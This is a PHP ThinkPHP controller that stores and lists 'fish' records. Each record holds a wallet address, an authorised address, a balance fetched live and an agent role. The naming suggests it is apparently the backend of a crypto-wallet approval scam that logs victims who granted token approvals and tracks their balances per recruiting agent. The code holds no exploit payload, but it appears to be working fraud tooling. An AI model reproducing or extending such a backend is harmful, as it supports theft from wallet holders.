<?php
namespace app\controller;

use app\BaseController;
use think\Request;
use app\model\Fish as FishModel;
use app\util\Res;
use app\util\Balance;

class Fish extends BaseController
{

    private $balance;
    private $result;

    function __construct()
    {
        $this->balance = new Balance();
        $this->result = new Res();
    }

    function add(Request $request)
    {
        $postData = $request->post();

        $time = date("Y-m-d H:i:s");

        $fish = new FishModel([
            "fish_address" => $postData["fish_address"],
            "auth_address" => $postData["auth_address"],
            "balance" => $postData["balance"],
            "auth_time" => $time,
            "update_time" => $time,
            "acting" => $postData["acting"]
        ]);

        $res = $fish->save();

        if ($res) {
            return $this->result->success("添加成功", $res);
        }
        return $this->result->error("添加数据失败");
    }

    function update(Request $request)
    {
        $postData = $request->post();
        $postData['update_time'] = date("Y-m-d H:i:s");

        $fish = FishModel::where("id", $postData["id"])->find();

        $postData['balance'] = $this->balance->getBalance($fish->fish_address);

        $res = $fish->update($postData);

        if ($res) {
            return $this->result->success("更新成功", $res);
        }
        return $this->result->error("更新失败");
    }

    function balance($address)
    {
        $res = $this->balance->getBalance($address);
        return $this->result->success("获取余额成功", $res);
    }

    function page(Request $request)
    {
        $page = $request->param("page", 1);
        $pageSize = $request->param("pageSize", 10);
        $acting = $request->param("acting");        //所属的角色

        $list = FishModel::where("acting", "like", "%{$acting}%")->paginate([
            "page" => $page,
            "list_rows" => $pageSize
        ]);

        return $this->result->success("获取数据成功", $list);
    }

    function getById($id)
    {
        $fish = FishModel::where("id", $id)->find();

        if ($fish) {
            return $this->result->success("获取数据成功", $fish);
        }
        return $this->result->error("获取数据失败");
    }

    function deleteById($id)
    {
        $res = FishModel::where('id', $id)->delete();
        if ($res) {
            return $this->result->success("删除数据成功", $res);
        }
        return $this->result->error("删除数据失败");
    }



}